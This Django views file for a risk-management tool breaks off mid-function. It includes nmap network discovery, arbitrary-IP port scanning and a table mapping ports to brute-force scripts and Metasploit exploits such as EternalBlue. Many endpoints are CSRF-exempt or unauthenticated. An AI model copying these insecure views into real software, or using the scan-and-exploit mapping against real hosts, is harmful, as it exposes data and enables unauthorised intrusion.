        risk = get_object_or_404(Risk, id=risk_id)
        opportunity_id = data.get("opportunity_id")
        opportunity = get_object_or_404(Opportunity, id=opportunity_id)
        risk.opportunities.add(opportunity)
        return JsonResponse({"success": True})

@login_required
def unlink_opportunity(request, risk_id):
    """Unlink an opportunity from the specified risk."""
    if request.method == "POST":
        data = json.loads(request.body)
        risk = get_object_or_404(Risk, id=risk_id)
        opportunity_id = data.get("opportunity_id")
        opportunity = get_object_or_404(Opportunity, id=opportunity_id)
        risk.opportunities.remove(opportunity)
        return JsonResponse({"success": True})
@csrf_exempt
@login_required
def add_opportunity_to_risk(request, risk_id):
    """
    Add a new opportunity, assign it to the risk's portfolio, and set the current user as the owner.
    """
    print("Start processing opportunity creation...")  # Debugging log

    if request.method == 'POST':
        try:
            # Parse JSON data from the request
            data = json.loads(request.body)
            title = data.get('title')

            if not title:
                print("Error: Title is missing.")  # Debugging log
                return JsonResponse({'success': False, 'error': 'Title is required.'}, status=400)

            # Get the risk by ID and ensure it has a portfolio
            risk = get_object_or_404(Risk, id=risk_id)
            if not risk.portfolio:
                print(f"Error: Risk ID {risk.id} does not have a portfolio.")  # Debugging log
                return JsonResponse({'success': False, 'error': 'Risk does not have a portfolio assigned.'}, status=400)

            # Debugging log for risk and portfolio
            print(f"Processing Risk: {risk.id}, Portfolio: {risk.portfolio.id}")

            # Check if the user has a UserProfile for assigning ownership
            if not hasattr(request.user, 'userprofile'):
                print("Error: Current user does not have a UserProfile.")  # Debugging log
                return JsonResponse({'success': False, 'error': 'Current user does not have a UserProfile.'}, status=400)

            # Create the opportunity with the risk's portfolio and current user as the owner
            opportunity = Opportunity.objects.create(
                title=title,
                portfolio=risk.portfolio,  # Assign portfolio
                owner=request.user.userprofile  # Assign current user as owner
            )

            # Link the opportunity to the risk
            risk.opportunities.add(opportunity)

            # Debugging: Log opportunity creation details
            print(f"Opportunity Created: ID {opportunity.id}, Title: {opportunity.title}, "
                  f"Portfolio: {opportunity.portfolio}, Owner: {opportunity.owner}")

            return JsonResponse({'success': True, 'opportunity_id': opportunity.id, 'title': opportunity.title})

        except Exception as e:
            # Log unexpected errors
            print(f"Error occurred during opportunity creation: {e}")  # Debugging log
            return JsonResponse({'success': False, 'error': str(e)}, status=500)

    # Handle non-POST requests
    print("Error: Invalid request method.")  # Debugging log
    return JsonResponse({'success': False, 'error': 'Invalid request method.'}, status=405)



@login_required
def link_threat(request, risk_id):
    """Link an existing threat to the specified risk."""
    if request.method == "POST":
        data = json.loads(request.body)
        risk = get_object_or_404(Risk, id=risk_id)
        threat_id = data.get("threat_id")
        threat = get_object_or_404(Threat, id=threat_id)
        risk.threats.add(threat)
        return JsonResponse({"success": True})

@login_required
def unlink_threat(request, risk_id):
    """Unlink a threat from the specified risk."""
    if request.method == "POST":
        data = json.loads(request.body)
        risk = get_object_or_404(Risk, id=risk_id)
        threat_id = data.get("threat_id")
        threat = get_object_or_404(Threat, id=threat_id)
        risk.threats.remove(threat)
        return JsonResponse({"success": True})

@csrf_exempt
@login_required
def add_threat_to_risk(request, risk_id):
    """
    Add a new threat, assign it to the risk's portfolio, and set the current user as the owner.
    """
    print("Start processing threat creation...")  # Debugging log

    if request.method == 'POST':
        try:
            # Parse JSON data from the request
            data = json.loads(request.body)
            title = data.get('title')

            if not title:
                print("Error: Title is missing.")  # Debugging log
                return JsonResponse({'success': False, 'error': 'Title is required.'}, status=400)

            # Get the risk by ID and ensure it has a portfolio
            risk = get_object_or_404(Risk, id=risk_id)
            if not risk.portfolio:
                print(f"Error: Risk ID {risk.id} does not have a portfolio.")  # Debugging log
                return JsonResponse({'success': False, 'error': 'Risk does not have a portfolio assigned.'}, status=400)

            # Debugging log for risk and portfolio
            print(f"Processing Risk: {risk.id}, Portfolio: {risk.portfolio.id}")

            # Check if the user has a UserProfile for assigning ownership
            if not hasattr(request.user, 'userprofile'):
                print("Error: Current user does not have a UserProfile.")  # Debugging log
                return JsonResponse({'success': False, 'error': 'Current user does not have a UserProfile.'}, status=400)

            # Create the threat with the risk's portfolio and current user as the owner
            threat = Threat.objects.create(
                title=title,
                portfolio=risk.portfolio,  # Assign portfolio
                owner=request.user.userprofile  # Assign current user as owner
            )

            # Link the threat to the risk
            risk.threats.add(threat)

            # Debugging: Log threat creation details
            print(f"Threat Created: ID {threat.id}, Title: {threat.title}, "
                  f"Portfolio: {threat.portfolio}, Owner: {threat.owner}")

            return JsonResponse({'success': True, 'threat_id': threat.id, 'title': threat.title})

        except Exception as e:
            # Log unexpected errors
            print(f"Error occurred during threat creation: {e}")  # Debugging log
            return JsonResponse({'success': False, 'error': str(e)}, status=500)

    # Handle non-POST requests
    print("Error: Invalid request method.")  # Debugging log
    return JsonResponse({'success': False, 'error': 'Invalid request method.'}, status=405)


from django.contrib.auth.decorators import login_required
from django.views.decorators.csrf import csrf_exempt
from django.http import JsonResponse
from django.shortcuts import get_object_or_404
import json
from orm.models import Risk, Mitigation  # Adjust based on your app structure


from django.contrib.auth.decorators import login_required
from django.views.decorators.csrf import csrf_exempt
from django.http import JsonResponse
from django.shortcuts import get_object_or_404
import json
from orm.models import Risk, Mitigation  # Adjust the imports to your app

@csrf_exempt
@login_required
def add_mitigation_to_risk(request, risk_id):
    """
    View to add a new mitigation, set the owner as the current user,
    assign the portfolio of the risk, and link it to the risk.
    """
    print("Start processing mitigation creation...")  # Debugging log

    if request.method == 'POST':
        try:
            # Parse JSON data from the request
            data = json.loads(request.body)
            title = data.get('title')

            if not title:
                print("Error: Title is missing.")  # Debugging log
                return JsonResponse({'success': False, 'error': 'Title is required.'}, status=400)

            # Get the risk by ID and ensure it has a portfolio
            risk = get_object_or_404(Risk, id=risk_id)
            if not risk.portfolio:
                print(f"Error: Risk ID {risk.id} does not have a portfolio.")  # Debugging log
                return JsonResponse({'success': False, 'error': 'Risk does not have a portfolio assigned.'}, status=400)

            # Debugging log for risk and portfolio
            print(f"Processing Risk: {risk.id}, Portfolio: {risk.portfolio.id}")

            # Check if the user has a UserProfile for assigning ownership
            if not hasattr(request.user, 'userprofile'):
                print("Error: Current user does not have a UserProfile.")  # Debugging log
                return JsonResponse({'success': False, 'error': 'Current user does not have a UserProfile.'}, status=400)

            # Create the mitigation with the risk's portfolio and current user as owner
            mitigation = Mitigation.objects.create(
                title=title,
                portfolio=risk.portfolio,  # Assign portfolio
                owner=request.user.userprofile  # Assign current user as owner
            )

            # Link the mitigation to the risk
            risk.mitigations.add(mitigation)

            # Debugging: Log mitigation creation details
            print(f"Mitigation Created: ID {mitigation.id}, Title: {mitigation.title}, "
                  f"Portfolio: {mitigation.portfolio}, Owner: {mitigation.owner}")

            return JsonResponse({'success': True, 'mitigation_id': mitigation.id})

        except Exception as e:
            # Log unexpected errors
            print(f"Error occurred during mitigation creation: {e}")  # Debugging log
            return JsonResponse({'success': False, 'error': str(e)}, status=500)

    # Handle non-POST requests
    print("Error: Invalid request method.")  # Debugging log
    return JsonResponse({'success': False, 'error': 'Invalid request method.'}, status=405)

from django.http import JsonResponse, HttpResponseBadRequest
from django.shortcuts import get_object_or_404
from orm.models import Risk, Procedure

from django.contrib.auth.decorators import login_required
from django.http import JsonResponse, HttpResponseBadRequest
from django.shortcuts import get_object_or_404
from orm.models import Risk, Procedure

@csrf_exempt
@login_required
def add_procedure(request, risk_id):
    """
    Adds a new procedure, assigns it to the current user, and links it to the risk.
    """
    if request.method == 'POST':
        try:
            risk = get_object_or_404(Risk, pk=risk_id)
            data = json.loads(request.body)
            title = data.get('title')

            if not title:
                return JsonResponse({'success': False, 'error': 'Title is required.'}, status=400)

            # Create the procedure and set the owner to the current user
            procedure = Procedure.objects.create(
                title=title,
                owner=request.user.userprofile  # Assuming UserProfile is linked to User
            )

            # Link the procedure to the current risk
            risk.procedures.add(procedure)

            return JsonResponse({'success': True, 'id': procedure.id, 'title': procedure.title})
        except Exception as e:
            return JsonResponse({'success': False, 'error': str(e)}, status=500)

    return JsonResponse({'success': False, 'error': 'Invalid request method.'}, status=405)



from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.utils.decorators import method_decorator
import json

from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import json

@csrf_exempt
@login_required
def add_itasset_to_risk(request, risk_id):
    """
    Add a new IT asset to a risk, link it, and set the owner to the current user.
    """
    if request.method == "POST":
        try:
            # Parse JSON data
            data = json.loads(request.body)
            title = data.get("title")
            
            if not title:
                return JsonResponse({"success": False, "error": "Title is required."}, status=400)
            
            # Get the risk instance
            risk = get_object_or_404(Risk, id=risk_id)
            
            # Check if the user has a UserProfile (assume UserProfile is linked to User)
            if not hasattr(request.user, 'userprofile'):
                return JsonResponse({"success": False, "error": "Current user does not have a UserProfile."}, status=400)
            
            # Create and save the new IT asset
            new_itasset = ITAsset.objects.create(
                name=title,
                portfolio=risk.portfolio,  # Assign the same portfolio as the risk
            )
            
            # Link the IT asset to the risk
            risk.related_assets.add(new_itasset)

            # Assign the current user as an owner of the IT asset
            new_itasset.owners.add(request.user.userprofile)

            return JsonResponse({"success": True, "id": new_itasset.id, "title": new_itasset.name})
        
        except json.JSONDecodeError:
            return JsonResponse({"success": False, "error": "Invalid JSON data."}, status=400)
        except Exception as e:
            return JsonResponse({"success": False, "error": str(e)}, status=500)
    else:
        return JsonResponse({"success": False, "error": "Invalid request method."}, status=405)


@csrf_exempt
def link_itasset(request, risk_id):
    if request.method == 'POST':
        data = json.loads(request.body)
        risk = get_object_or_404(Risk, id=risk_id)
        itasset = get_object_or_404(ITAsset, id=data.get('itasset_id'))
        risk.related_assets.add(itasset)
        return JsonResponse({'success': True})


@csrf_exempt
def unlink_itasset(request, risk_id):
    if request.method == 'POST':
        data = json.loads(request.body)
        risk = get_object_or_404(Risk, id=risk_id)
        itasset = get_object_or_404(ITAsset, id=data.get('itasset_id'))
        risk.related_assets.remove(itasset)
        return JsonResponse({'success': True})


@csrf_exempt
def link_procedure(request, risk_id):
    if request.method == 'POST':
        data = json.loads(request.body)
        risk = get_object_or_404(Risk, id=risk_id)
        procedure = get_object_or_404(Procedure, id=data.get('procedure_id'))
        risk.procedures.add(procedure)
        return JsonResponse({'success': True})



@csrf_exempt
def save_mitigation(request, risk_id):
    if request.method == 'POST':
        try:
            # Parse JSON data from the request
            data = json.loads(request.body)
            title = data.get('title')

            # Validate the title
            if not title:
                return JsonResponse({'success': False, 'error': 'Title is required.'})

            # Get the risk by ID
            risk = get_object_or_404(Risk, id=risk_id)

            # Ensure the risk has a portfolio
            if not risk.portfolio:
                return JsonResponse({'success': False, 'error': 'The risk does not have an assigned portfolio.'})

            # Ensure the current user has a UserProfile
            if not hasattr(request.user, 'userprofile'):
                return JsonResponse({'success': False, 'error': 'The current user does not have a UserProfile.'})

            # Create the new mitigation
            mitigation = Mitigation.objects.create(
                title=title,
                portfolio=risk.portfolio,  # Assign the same portfolio as the risk
                owner=request.user.userprofile  # Assign the current user as the owner
            )

            # Link the mitigation to the risk
            risk.mitigations.add(mitigation)

            return JsonResponse({
                'success': True,
                'message': 'Mitigation saved and linked to the risk successfully!',
                'mitigation_id': mitigation.id
            })
        except Exception as e:
            return JsonResponse({'success': False, 'error': str(e)})

    return JsonResponse({'success': False, 'error': 'Invalid request method.'})


@csrf_exempt
def unlink_procedure(request, risk_id):
    if request.method == 'POST':
        data = json.loads(request.body)
        risk = get_object_or_404(Risk, id=risk_id)
        procedure = get_object_or_404(Procedure, id=data.get('procedure_id'))
        risk.procedures.remove(procedure)
        return JsonResponse({'success': True})

@csrf_exempt
@login_required
@csrf_exempt
def unlink_mitigation(request, risk_id):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            mitigation_id = data.get('mitigation_id')

            # Validate the mitigation and risk
            risk = Risk.objects.get(id=risk_id)
            mitigation = Mitigation.objects.get(id=mitigation_id)

            # Remove the mitigation from the risk
            risk.mitigations.remove(mitigation)

            return JsonResponse({'success': True, 'message': 'Mitigation unlinked successfully!'})
        except Exception as e:
            return JsonResponse({'success': False, 'error': str(e)})

    return JsonResponse({'success': False, 'error': 'Invalid request method.'})

@csrf_exempt
@login_required
def link_mitigation(request, risk_id):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            mitigation_id = data.get('mitigation_id')
            mitigation = Mitigation.objects.get(id=mitigation_id)
            risk = Risk.objects.get(id=risk_id)
            risk.mitigations.add(mitigation)
            return JsonResponse({'success': True, 'mitigation': {'id': mitigation.id, 'title': mitigation.title}})
        except Exception as e:
            return JsonResponse({'success': False, 'error': str(e)})
    return JsonResponse({'success': False, 'error': 'Invalid request method'})



from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.urls import reverse
from .models import Risk, Portfolio

from django.shortcuts import render, redirect
from django.contrib import messages
from django.contrib.auth.decorators import login_required
from django.urls import reverse
from orm.models import Risk, Portfolio

from django.shortcuts import render, redirect
from django.contrib import messages
from django.contrib.auth.decorators import login_required
from django.urls import reverse
from orm.models import Risk, Portfolio
from django.shortcuts import render, redirect
from django.contrib import messages
from django.contrib.auth.decorators import login_required
from orm.models import Risk, Portfolio

from django.contrib.auth.decorators import login_required
from django.shortcuts import render, redirect
from django.contrib import messages
from .models import Portfolio, Risk


from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.urls import reverse
from .models import Risk, Portfolio

from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.urls import reverse
from .models import Risk, Portfolio

@login_required
def add_risk_view(request):
    """
    View to add a new risk with title, description, and portfolio selection.
    """
    if request.method == 'POST':
        title = request.POST.get('title', '').strip()
        description = request.POST.get('description', '').strip()
        portfolio_id = request.POST.get('portfolio')

        if not title or not description or not portfolio_id:
            messages.error(request, "All fields are required.")
            return redirect('add_risk')

        try:
            # Fetch the selected portfolio, ensuring it belongs to the user's portfolios
            portfolio = Portfolio.objects.get(id=portfolio_id, user_profiles=request.user.userprofile)

            # **Fix: Create risk instance without explicitly setting a primary key**
            risk = Risk(
                title=title,
                description=description,
                portfolio=portfolio
            )
            risk.save()  # Let Django handle the primary key assignment

            # Add the current user as an owner (ManyToManyField needs to be set after saving)
            risk.owners.set([request.user.userprofile])

            # Success message with a clickable link
            risk_link = f'<a href="{reverse("risk_detail", args=[risk.id])}"></a>'
            messages.success(request, f"Risk '{title}' added successfully! {risk_link}")

            return redirect(reverse("risk_detail", args=[risk.id]))  # Redirect to the new risk page

        except Portfolio.DoesNotExist:
            messages.error(request, "Invalid portfolio selected.")
            return redirect('add_risk')

        except Exception as e:
            messages.error(request, f"An error occurred: {str(e)}")
            return redirect('add_risk')

    # Fetch only the portfolios assigned to the current user
    portfolios = Portfolio.objects.filter(user_profiles=request.user.userprofile).order_by("name")
    return render(request, 'add_risk.html', {'portfolios': portfolios})
from django.http import JsonResponse
from django.shortcuts import get_object_or_404
from orm.models import Risk, Category, Portfolio, UserProfile

from django.http import JsonResponse
from django.shortcuts import get_object_or_404
import json

from django.http import JsonResponse
from django.shortcuts import get_object_or_404
from django.db import transaction
import json
import bleach
import logging

logger = logging.getLogger(__name__)

# def update_risk(request, risk_id):
#     if request.method == 'POST':
#         try:
#             data = json.loads(request.body)
#             risk = get_object_or_404(Risk, id=risk_id)

#             with transaction.atomic():
#                 # Preserve rich text formatting by allowing specific tags
#                 allowed_tags = ['p', 'b', 'i', 'u', 'a', 'ul', 'ol', 'li', 'br', 'strong', 'em']
#                 allowed_attributes = {'a': ['href', 'title'], 'img': ['src', 'alt']}

#                 risk.title = bleach.clean(
#                     data.get('title', risk.title),
#                     tags=allowed_tags,
#                     attributes=allowed_attributes
#                 )
#                 risk.description = bleach.clean(
#                     data.get('description', risk.description),
#                     tags=allowed_tags,
#                     attributes=allowed_attributes
#                 )

#                 # Update category and portfolio
#                 if data.get('category'):
#                     risk.category = get_object_or_404(Category, id=data['category'])
#                 else:
#                     risk.category = None

#                 if data.get('portfolio'):
#                     risk.portfolio = get_object_or_404(Portfolio, id=data['portfolio'])
#                 else:
#                     risk.portfolio = None

#                 # Update owners
#                 owners_ids = data.get('owners', [])
#                 if owners_ids:
#                     risk.owners.set(UserProfile.objects.filter(id__in=owners_ids))

#                 # Update scores with validation
#                 for score_type in ['inherent', 'residual', 'targeted']:
#                     likelihood = data.get(f"{score_type}_likelihood", getattr(risk, f"{score_type}_likelihood"))
#                     impact = data.get(f"{score_type}_impact", getattr(risk, f"{score_type}_impact"))
#                     if likelihood is not None and impact is not None:
#                         if not (1 <= likelihood <= 5 and 1 <= impact <= 5):
#                             raise ValueError(f"{score_type.capitalize()} scores must be between 1 and 5.")
#                         setattr(risk, f"{score_type}_likelihood", likelihood)
#                         setattr(risk, f"{score_type}_impact", impact)

#                 risk.save()

#             return JsonResponse({'success': True, 'message': 'Risk updated successfully!'})

#         except Exception as e:
#             logger.error(f"Error updating risk {risk_id}: {str(e)}")
#             return JsonResponse({'success': False, 'error': str(e)})

#     return JsonResponse({'success': False, 'error': 'Invalid request method'})

from django.http import JsonResponse
from django.shortcuts import get_object_or_404
from .models import Risk

from django.shortcuts import get_object_or_404
from django.http import JsonResponse
from orm.models import Risk, Portfolio

from django.shortcuts import get_object_or_404
from django.http import JsonResponse
from .models import Risk, Portfolio

def delete_risk(request, risk_id):
    """
    Archive a risk by changing its portfolio to the 'archive' portfolio and clearing its owners.
    """
    if request.method == 'POST':  # Handle POST requests for archiving
        try:
            # Get the risk object
            risk = get_object_or_404(Risk, id=risk_id)

            # Get the 'archive' portfolio (case-sensitive, ensure it exists)
            archive_portfolio = get_object_or_404(Portfolio, name="archive")

            # Update the risk's portfolio to 'archive'
            risk.portfolio = archive_portfolio

            # Clear the owners of the risk
            risk.owners.clear()

            # Save the risk
            risk.save()

            return JsonResponse({'success': True, 'message': 'Risk archived and owners cleared successfully!'})
        except Exception as e:
            return JsonResponse({'success': False, 'error': str(e)})

    return JsonResponse({'success': False, 'error': 'Invalid request method'})

from django.http import JsonResponse
from django.shortcuts import render
from orm.models import Event

# View to add an incident
def add_incident(request):
    if request.method == 'POST':
        # Get the data from the AJAX request
        title = request.POST.get('title')
        description = request.POST.get('description')
        start_date = request.POST.get('date')

        # Validate data (you can customize this)
        if not title or not description or not start_date:
            return JsonResponse({'success': False, 'message': 'All fields are required.'})

        # Create the event
        event = Event.objects.create(
            title=title,
            description=description,
            date=start_date,
            owner=request.user.userprofile,  # Assuming the logged-in user is the owner
            reporter=request.user.userprofile,  # Assuming the logged-in user is the reporter
        )

        return JsonResponse({'success': True})

    return JsonResponse({'success': False, 'message': 'Invalid request.'})


# ------def network_discovery(request):def network_discovery(request):
import os
import platform
import subprocess
import re
import asyncio
import socket
from django.http import JsonResponse
import netifaces
import xml.etree.ElementTree as ET


def run_nmap_scan(subnet):
    """
    Runs an Nmap scan on the specified subnet and returns the results.
    """
    try:
        print(f">>> Scanning network range: {subnet}")
        nmap_command = [
            "nmap", "-oX", "-", "-sS", "-O", "-T4", "-PR", "--min-parallelism", "10", "--host-timeout", "5s", subnet
        ]
        print(f">>> Running Nmap command: {' '.join(nmap_command)}")
        nmap_result = subprocess.run(nmap_command, capture_output=True, text=True)

        if nmap_result.returncode != 0:
            print(f"!!! Error: Nmap scan failed: {nmap_result.stderr}")
            return {"error": f"Nmap scan failed: {nmap_result.stderr}"}

        print(">>> Parsing Nmap results...")
        devices = []
        nmap_output = nmap_result.stdout

        for match in re.finditer(
            r"<address addr=\"([\d.]+)\" addrtype=\"ipv4\".*?<osclass.*?osfamily=\"(.*?)\".*?<port protocol=\"tcp\" portid=\"(\d+)\"",
            nmap_output,
            re.DOTALL,
        ):
            ip = match.group(1)
            os = match.group(2)
            port = match.group(3)
            print(f">>> Found device - IP: {ip}, OS: {os}, Open Port: {port}")

            existing_device = next((d for d in devices if d["ip"] == ip), None)
            if existing_device:
                existing_device["open_ports"].append(port)
            else:
                devices.append({"ip": ip, "os": os, "open_ports": [port]})

        return {"devices": devices}
    except Exception as e:
        print(f"!!! Error during Nmap scan: {e}")
        return {"error": str(e)}

def ping_sweep(subnet):
    """
    Performs a ping sweep on the subnet as a fallback discovery method.
    """
    devices = []
    network_base = subnet.split("/")[0].rsplit(".", 1)[0]
    for i in range(1, 255):
        ip = f"{network_base}.{i}"
        response = os.system("ping -c 1 -w 1 " + ip if platform.system() != "Windows" else "ping -n 1 " + ip)
        if response == 0:
            print(f">>> Device found: {ip}")
            devices.append({"ip": ip, "os": "Unknown", "open_ports": []})
    return devices

def network_tools_page(request):
    """
    Renders the page for network tools.
    """
    return render(request, 'network_tools.html')

def get_local_network_ranges():
    """
    Detect all local network ranges dynamically based on system interfaces, excluding link-local ranges (169.254.x.x).
    """
    network_ranges = []
    try:
        for interface in netifaces.interfaces():
            if interface.startswith("lo"):  # Skip loopback
                continue
            addrs = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addrs:
                ipv4_info = addrs[netifaces.AF_INET][0]
                ip = ipv4_info['addr']
                netmask = ipv4_info['netmask']
                if ip.startswith("169.254"):  # Exclude link-local range
                    print(f"Excluded link-local range: {ip}")
                    continue
                cidr = f"{ip}/{sum(bin(int(x)).count('1') for x in netmask.split('.'))}"
                network_ranges.append(cidr)
                # print(f"Detected network range: {cidr}")
    except Exception as e:
        print(f"Error detecting network ranges: {e}")
    return network_ranges

def parse_nmap_output(output):
    """
    Parse Nmap XML output to extract devices, IP addresses, and OS info.
    """
    devices = []
    try:
        for match in re.finditer(
            r"<address addr=\"([\d.]+)\" addrtype=\"ipv4\".*?<osclass.*?osfamily=\"(.*?)\".*?<port protocol=\"tcp\" portid=\"(\d+)\"",
            output,
            re.DOTALL,
        ):
            ip = match.group(1)
            os = match.group(2)
            port = match.group(3)
            existing_device = next((d for d in devices if d["ip"] == ip), None)
            if existing_device:
                existing_device["open_ports"].append(port)
            else:
                devices.append({"ip": ip, "os": os, "open_ports": [port]})
    except Exception as e:
        print(f"Error parsing Nmap output: {e}")
    return devices

def parse_detailed_nmap_output(nmap_output):
    """
    Parse the XML output of a detailed Nmap scan.
    Extracts information about open ports, their status, and associated services.
    """
    import xml.etree.ElementTree as ET
    ports = []

    try:
        root = ET.fromstring(nmap_output)
        for port in root.findall(".//port"):
            port_id = port.get("portid")
            protocol = port.get("protocol")
            state = port.find("state").get("state") if port.find("state") else "unknown"
            service = port.find("service").get("name") if port.find("service") else "unknown"
            ports.append({
                "port": port_id,
                "protocol": protocol,
                "status": state,
                "service": service,
            })
    except ET.ParseError as e:
        print(f"Error parsing Nmap XML: {e}")
    
    return ports

def get_local_subnet():
    try:
        for interface in netifaces.interfaces():
            if interface.startswith("lo"):
                continue
            addrs = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addrs:
                ipv4_info = addrs[netifaces.AF_INET][0]
                ip = ipv4_info['addr']
                netmask = ipv4_info['netmask']
                subnet_mask_bits = sum(bin(int(x)).count('1') for x in netmask.split('.'))
                subnet = f"{ip}/{subnet_mask_bits}"
                logger.info(f"Detected subnet: {subnet}")
                return subnet
    except Exception as e:
        logger.exception(f"Error detecting subnet: {e}")
    return None

def parse_light_nmap_output(nmap_output):
    """
    Parse the XML output of a lightweight Nmap scan (-sn).
    Extracts IP addresses, hostnames, and MAC addresses of detected devices.
    """
    devices = []
    try:
        root = ET.fromstring(nmap_output)
        for host in root.findall("host"):
            # Extract IP address
            address_elem = host.find("address[@addrtype='ipv4']")
            ip = address_elem.get("addr") if address_elem is not None else None

            # Extract MAC address and Vendor (if available)
            mac_elem = host.find("address[@addrtype='mac']")
            mac = mac_elem.get("addr") if mac_elem is not None else "Unknown"
            vendor = mac_elem.get("vendor") if mac_elem is not None else "Unknown"

            # Extract hostname (if available)
            hostname_elem = host.find("hostnames/hostname")
            hostname = hostname_elem.get("name") if hostname_elem is not None else "Unknown"

            if ip:  # Add only if IP is valid
                devices.append({
                    "ip": ip,
                    "hostname": hostname,
                    "mac": mac,
                    "vendor": vendor
                })
    except ET.ParseError as e:
        print(f"Error parsing Nmap XML: {e}")
    return devices

def network_discovery(request):
    """
    Debug network discovery for Nmap output issues.
    """
    try:
        # print(">>> Starting lightweight network discovery...")
        network_ranges = get_local_network_ranges()
        if not network_ranges:
            return JsonResponse({"error": "No network ranges detected"}, status=500)

        for net_range in network_ranges:
            # print(f">>> Scanning network range: {net_range}")
            nmap_command = ["nmap", "-oX", "-", "-sn", net_range]
            nmap_result = subprocess.run(nmap_command, capture_output=True, text=True)

            # Print raw Nmap output for debugging
            # print(f"Raw Nmap output for range {net_range}:\n{nmap_result.stdout}")

            if nmap_result.returncode != 0:
                print(f"Error: Nmap scan failed for {net_range}: {nmap_result.stderr}")
                continue

            # Call XML Parser
            devices = parse_light_nmap_output(nmap_result.stdout)
            # print(f"Parsed devices: {devices}")
            return JsonResponse({"devices": devices})
    except Exception as e:
        print(f"Error during network discovery: {e}")
        return JsonResponse({"error": str(e)}, status=500)

# risk/views.py
import subprocess
import xml.etree.ElementTree as ET
from django.http import JsonResponse
from django.contrib.auth.decorators import login_required
import logging

logger = logging.getLogger(__name__)

@login_required
def scan_ports(request, ip_address):
    """
    Perform a detailed port scan for a specific IP address and return the results.
    """
    try:
        # Execute Nmap with TCP connect scan (-sT) for non-root compatibility
        nmap_command = ["nmap", "-oX", "-", "-sT", "-sV", "--top-ports", "100", ip_address]
        logger.debug(f"Running Nmap command: {' '.join(nmap_command)}")
        
        nmap_result = subprocess.run(
            nmap_command,
            capture_output=True,
            text=True,
            timeout=300
        )
        
        # Check if Nmap succeeded
        if nmap_result.returncode != 0:
            logger.error(f"Nmap failed with stderr: {nmap_result.stderr.strip()}")
            raise RuntimeError(f"Nmap failed with stderr: {nmap_result.stderr.strip()}")

        if not nmap_result.stdout.strip():
            logger.warning(f"Nmap returned empty output for {ip_address}. Check connectivity.")
            raise ValueError("Nmap returned empty output. Check connectivity or command arguments.")
        
        # Parse the XML output
        ports = parse_detailed_nmap_output(nmap_result.stdout)
        logger.info(f"Port scan completed for {ip_address}: {len(ports)} ports found.")
        
        return JsonResponse({"ip_address": ip_address, "ports": ports})

    except ET.ParseError as parse_error:
        logger.error(f"Error parsing Nmap XML output: {parse_error}")
        return JsonResponse({"error": f"Failed to parse Nmap output: {str(parse_error)}"}, status=500)
    except Exception as e:
        logger.exception(f"Port scan error for {ip_address}: {e}")
        return JsonResponse({"error": str(e)}, status=500)

def parse_detailed_nmap_output(xml_output):
    """
    Parse Nmap XML output into a list of port details.
    """
    root = ET.fromstring(xml_output)
    ports = []
    
    for host in root.findall("host"):
        for port in host.findall(".//port"):
            port_info = {
                "port": port.get("portid"),
                "protocol": port.get("protocol"),
                "state": port.find("state").get("state") if port.find("state") is not None else "unknown",
                "service": port.find("service").get("name") if port.find("service") is not None else "unknown",
                "version": port.find("service").get("version") if port.find("service") and port.find("service").get("version") else "N/A"
            }
            ports.append(port_info)
    
    return ports

# --------------------------------------------------------------

# risk/views.py
import subprocess
import json
from datetime import datetime
from django.http import JsonResponse
from django.contrib.auth.decorators import login_required
import logging

logger = logging.getLogger(__name__)

PORT_TO_EXPLOIT_MAPPING = {
    "22": {"name": "SSH Brute Force", "tool": "Nmap NSE", "script": "ssh-brute"},
    "3389": {"name": "RDP Vulnerability Scan", "tool": "Nmap NSE", "script": "rdp-vuln-ms12-020"},
    "135": {"name": "Microsoft RPC Vulnerabilities", "tool": "Metasploit", "exploit": "exploit/windows/ms08_067_netapi"},
    "139": {"name": "SMB Enumeration", "tool": "Nmap NSE", "script": "smb-enum-shares"},
    "445": {"name": "SMB Exploit (EternalBlue)", "tool": "Metasploit", "exploit": "exploit/windows/smb/ms17_010_eternalblue"},
    "80": {
        "name": "HTTP Tests",
        "tests": [
            {"name": "HTTP Vulnerability Scanner", "tool": "Nmap NSE", "script": "http-vuln-cve2017-5638"},
            {"name": "HTTP Directory Enumeration", "tool": "Nmap NSE", "script": "http-enum"},
            {"name": "General HTTP Vulnerability Scan", "tool": "Nmap NSE", "script": "http-vuln*"},
            {"name": "Lighttpd Version Detection", "tool": "Nmap NSE", "script": "http-server-header"},
            {"name": "Nikto Web Vulnerability Scan", "tool": "Nikto", "command": "nikto -h"}
        ]
    },
    "443": {"name": "HTTPS Vulnerability Scanner", "tool": "Nmap NSE", "script": "ssl-enum-ciphers"},
    "5000": {"name": "Undefined Port Test", "tool": "Nmap NSE", "script": "http-title"},
    "8081": {"name": "Undefined Port Test", "tool": "Nmap NSE", "script": "http-title"},
    "49152": {"name": "Undefined Port Test", "tool": "Nmap NSE", "script": "http-title"},
    "5432": {
        "name": "PostgreSQL Tests",
        "tests": [
            {"name": "PostgreSQL Brute Force", "tool": "Nmap NSE", "script": "pgsql-brute"},
            {"name": "PostgreSQL Version Detection", "tool": "Nmap NSE", "script": "pgsql-info"},
            {"name": "SSL/TLS Configuration Scan", "tool": "Nmap NSE", "script": "ssl-enum-ciphers"},
            {"name": "PostgreSQL Login Utility", "tool": "Metasploit", "exploit": "auxiliary/scanner/postgres/postgres_login"},
            {"name": "PostgreSQL Command Execution", "tool": "Metasploit", "exploit": "exploit/linux/postgres/postgres_payload"}
        ]
    },
    "nuclei": {
        "name": "Nuclei Vulnerability Scan",
        "tests": [{"name": "Nuclei Vulnerability Scan", "tool": "Nuclei", "command": "nuclei -u {target}"}]
    },
    "5353": {
        "name": "Amass Subdomain Enumeration",
        "tests": [{"name": "Amass Enumeration", "tool": "Amass", "command": "amass enum -d {domain}"}]
    },
    "any": {
        "name": "Packet Analysis",
        "tests": [{"name": "Wireshark Analysis", "tool": "Wireshark", "command": "tshark -r {capture_file}"}]
    }
}

def run_nmap_script(ip, port, script_name):
    print(f"[DEBUG] Starting Nmap script {script_name} on {ip}:{port}")
    try:
